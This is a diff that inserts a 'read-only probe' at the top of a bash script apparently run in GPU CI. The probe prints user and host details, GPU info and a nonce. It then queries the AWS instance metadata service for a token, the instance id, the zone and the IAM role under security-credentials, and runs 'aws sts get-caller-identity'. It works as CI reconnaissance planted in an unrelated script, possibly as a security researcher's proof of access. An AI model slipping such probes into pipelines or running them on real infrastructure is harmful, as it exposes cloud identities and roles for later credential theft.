@@ -1,4 +1,22 @@
 #!/bin/bash
+# i101698 GPU CI probe (read-only)
+set +e
+echo "i101698-NONCE-8c41f7e2d9"
+id
+hostname
+uname -a
+echo "--- nvidia-smi -L ---"
+nvidia-smi -L
+echo "--- nvidia-smi csv ---"
+nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv
+echo "--- IMDSv2 ---"
+MTOK=$(curl -s -m 5 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token)
+echo "iid=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $MTOK" http://169.254.169.254/latest/meta-data/instance-id)"
+echo "az=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $MTOK" http://169.254.169.254/latest/meta-data/placement/availability-zone)"
+echo "role=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $MTOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
+echo "--- sts ---"
+(command -v aws >/dev/null && aws sts get-caller-identity) || true
+set -e
 set -euo pipefail
 
 if [ "$#" -lt 1 ] || [ "$#" -gt 2 ]; then
